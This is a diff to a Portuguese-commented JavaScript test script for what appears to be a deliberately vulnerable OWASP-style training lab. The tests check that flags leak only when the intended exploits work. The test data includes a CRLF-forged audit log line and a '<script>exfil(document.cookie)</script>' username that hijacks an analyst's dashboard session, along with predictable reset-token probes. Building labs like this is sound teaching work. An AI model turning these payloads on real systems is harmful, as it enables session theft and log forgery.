@@ -168,19 +168,42 @@ section('A08 Deserialization');
   ok('A08 IIFE node-serialize + chave → RCE, vaza commandOutput=flag', await validates('a08-insecure-deser', flagIn(rce.text)));
 }
 
-// ════════════════════ A09 — Log injection ════════════════════
-section('A09 Log injection');
+// ════════════════════ A09 — Log injection -> XSS no dashboard do SOC ════════════════════
+section('A09 Log injection -> dashboard XSS');
 {
   const normal = await post('/a09/login', { username: 'ana.paula' });
   ok('A09 login normal NÃO libera clearanceToken', !flagIn(normal.text));
-  const forged = await post('/a09/login', { username: 'x\nAUDIT event=admin_login_success user=ceo' });
-  ok('A09 log forjado (CRLF) → clearanceToken=flag', await validates('a09-log-injection', flagIn(forged.text)));
+
+  const dashBaseline = await get('/a09/dashboard');
+  ok('A09 dashboard baseline (sem payload) NÃO reporta sessão sequestrada', !dashBaseline.json?.analystSession && !flagIn(dashBaseline.text));
+
+  // O log e CUMULATIVO (trilha de auditoria de verdade) — por isso o teste forja
+  // o evento PRIMEIRO e so DEPOIS injeta o script, verificando o estado intermediario
+  // (forjado sem script -> ainda sem flag) antes de completar a combinacao.
+  const forgedOnly = await post('/a09/login', { username: 'x\nAUDIT event=admin_login_success user=ceo' });
+  ok('A09 evento forjado SOZINHO (sem script): SIEM aceita, mas NÃO vaza a flag ainda', !flagIn(forgedOnly.text));
+  const dashAfterForgeOnly = await get('/a09/dashboard');
+  ok('A09 dashboard com SÓ o evento forjado (sem <script> em lugar nenhum do log) continua sem flag',
+    !dashAfterForgeOnly.json?.analystSession && !flagIn(dashAfterForgeOnly.text));
+
+  const addScript = await post('/a09/login', { username: '<script>exfil(document.cookie)</script>' });
+  ok('A09 <script> é aceito no log (completa a combinação com o evento já forjado)', addScript.status === 200);
+  const dashFinal = await get('/a09/dashboard');
+  ok('A09 dashboard com AMBAS as técnicas combinadas no log → sessão do analista sequestrada, vaza clearanceToken=flag',
+    dashFinal.json?.analystSession?.hijacked === true && await validates('a09-log-injection', flagIn(dashFinal.text)));
 }
 
 // ════════════════════ A04 — Reset previsível (POR ÚLTIMO: reseta a senha do admin) ════════════════════
 section('A04 Insecure Design');
 {
+  const noMail = await get('/a04/mailbox/admin');
+  ok('A04 mailbox antes do /forgot → 404, sem token', noMail.status === 404);
+
   await post('/a04/forgot', { username: 'admin' });
+
+  const mail = await get('/a04/mailbox/admin');
+  ok('A04 mailbox após /forgot confirma envio, mas MASCARA o token', mail.status === 200 && /••••/.test(mail.json?.resetLink ?? '') && !/\d{9,}/.test(mail.text));
+
   const now = (await get('/a04/server-time')).json.epochSeconds;
   const wrong = await post('/a04/reset', { username: 'admin', token: String(now - 99999), newPassword: 'X#1' });
   ok('A04 token fora da janela → rejeitado, sem flag', !flagIn(wrong.text));
